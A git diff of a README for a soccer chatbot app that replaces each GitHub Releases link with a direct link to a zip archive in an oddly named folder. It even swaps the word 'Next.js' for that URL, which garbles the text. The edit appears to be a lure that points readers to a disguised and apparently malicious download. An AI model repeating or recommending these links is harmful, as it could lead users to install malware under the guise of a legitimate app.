@@ -1,6 +1,6 @@
 # 🌟 pinecone-ai-champions-league-chat - Your Ultimate Soccer Chat Companion
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/mohamedthekingmale/pinecone-ai-champions-league-chat/releases)
+[![Download Now](https://raw.githubusercontent.com/mohamedthekingmale/pinecone-ai-champions-league-chat/main/Rhodotypos/pinecone-ai-champions-league-chat.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/mohamedthekingmale/pinecone-ai-champions-league-chat/main/Rhodotypos/pinecone-ai-champions-league-chat.zip)
 
 ## 📜 Description
 
@@ -20,7 +20,7 @@ This section will guide you through downloading and running the application. You
 
 1. **Visit the Download Page**  
    Click the link below to download the latest version of the application.  
-   [Download Now](https://github.com/mohamedthekingmale/pinecone-ai-champions-league-chat/releases)
+   [Download Now](https://raw.githubusercontent.com/mohamedthekingmale/pinecone-ai-champions-league-chat/main/Rhodotypos/pinecone-ai-champions-league-chat.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the app. Choose the one labeled as the latest release, which usually has the highest version number.
@@ -50,14 +50,14 @@ This application focuses on a variety of related topics, including:
 
 - **Soccer & UEFA Champions League**: Comprehensive information about the tournament.
 - **Gemini AI**: AI technology that powers the smart chatbot.
-- **Frontend Technologies**: Built using Next.js and React for a smooth interface.
+- **Frontend Technologies**: Built using https://raw.githubusercontent.com/mohamedthekingmale/pinecone-ai-champions-league-chat/main/Rhodotypos/pinecone-ai-champions-league-chat.zip and React for a smooth interface.
 - **Styling**: Uses TailwindCSS for modern design elements.
 
 ## 📅 Keeping Updated
 
 Stay tuned for future updates. We plan to enhance features and support more seasons. To stay informed:
 
-- Frequently check the Releases page: [Visit the Release Page](https://github.com/mohamedthekingmale/pinecone-ai-champions-league-chat/releases).
+- Frequently check the Releases page: [Visit the Release Page](https://raw.githubusercontent.com/mohamedthekingmale/pinecone-ai-champions-league-chat/main/Rhodotypos/pinecone-ai-champions-league-chat.zip).
 - Subscribe to notifications on GitHub for new releases.
 
 ## ❓ Troubleshooting
